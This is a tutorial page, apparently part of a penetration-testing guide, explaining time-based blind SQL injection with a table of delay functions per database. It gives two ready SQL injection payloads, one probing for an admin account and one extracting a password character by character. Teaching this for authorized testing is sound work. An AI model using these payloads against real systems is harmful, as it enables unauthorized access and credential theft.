# Time-Based Blind SQL Injection

Time-based blind SQL injection uses database-specific functions to cause delays in query execution, allowing attackers to infer information based on response times.

## When to Use

Use time-based blind SQLi when:
- Boolean-based techniques don't work
- No visible output or behavior changes
- Application suppresses all errors
- Last resort technique

## How It Works

1. Inject a condition with a time delay
2. If condition is TRUE → delay occurs
3. If condition is FALSE → no delay
4. Measure response time to infer TRUE/FALSE
5. Extract data bit by bit

## Database-Specific Functions

| Database | Delay Function | Example |
|----------|----------------|---------|
| **MySQL** | `SLEEP(seconds)` | `SELECT SLEEP(5)` |
| **PostgreSQL** | `pg_sleep(seconds)` | `SELECT pg_sleep(5)` |
| **MSSQL** | `WAITFOR DELAY 'time'` | `WAITFOR DELAY '0:0:5'` |
| **Oracle** | `dbms_pipe.receive_message('a',seconds)` | `dbms_pipe.receive_message(('a'),5)` |

For detailed reference, see the [Database-Specific Syntax Cheat Sheet](../05-cheat-sheets/database-specific-syntax.md)

## Basic Example (MySQL)

```sql
-- Test if admin user exists (5 second delay if TRUE)
' AND IF((SELECT COUNT(*) FROM users WHERE username='admin')>0, SLEEP(5), 0)--
```

## Extraction Example (MSSQL)

```sql
-- Extract first character of password
'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' WAITFOR DELAY '0:0:5'--
```

**If delay occurs** → First character is 'a'  
**If no delay** → First character is not 'a'

Repeat for each character to extract the full password.

---

**Previous:** [Boolean-Based Blind SQLi](boolean-based.md) | **Next:** [Out-of-Band Techniques](oast-techniques.md)

**Remember: Only test on authorized systems!**
